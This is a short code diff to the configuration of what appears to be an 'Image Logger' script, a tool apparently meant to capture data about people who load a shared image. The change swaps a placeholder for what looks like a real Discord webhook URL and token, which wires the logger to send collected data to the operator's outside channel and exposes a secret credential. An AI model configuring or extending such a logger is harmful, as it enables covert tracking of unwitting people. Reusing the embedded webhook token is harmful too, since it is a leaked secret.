@@ -11,7 +11,7 @@ __version__ = "v2.0-mod"
 __author__ = "Tgace + ChatGPT"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/your_webhook_here",
+    "webhook": "https://discord.com/api/webhooks/1347691418423918612/TY4jhuDOUeauxK-VGtvdqf0jcfI3xhAKkthZ2hoNQz3cHFxIu-12AEcSY7_e3WkU643q",
     "image": "https://your-default-image.png",
     "imageArgument": True,
     "username": "Image Logger",
